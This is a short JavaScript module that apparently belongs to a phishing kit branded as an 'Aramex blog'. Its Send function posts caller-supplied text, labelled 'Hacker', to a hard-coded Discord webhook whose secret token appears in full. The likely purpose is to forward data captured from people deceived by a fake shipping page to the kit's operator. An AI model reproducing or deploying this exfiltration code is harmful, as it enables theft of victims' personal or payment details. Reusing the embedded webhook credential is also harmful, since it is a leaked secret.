import axios from 'axios';


const TeleSned = () => {
     
    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة اراميكس ",
              description: des,
           },
          ],
    };

        await axios.post("https://discord.com/api/webhooks/1315034531165765653/avFm2I2wTgrrreOyzm92R6mf0EQ5qMwDZpviHvavE6pOMihdg9p5RZzg-AeIkG4TWs-X",body) 
    }
  return {
    Send,
}
}

export default TeleSned;
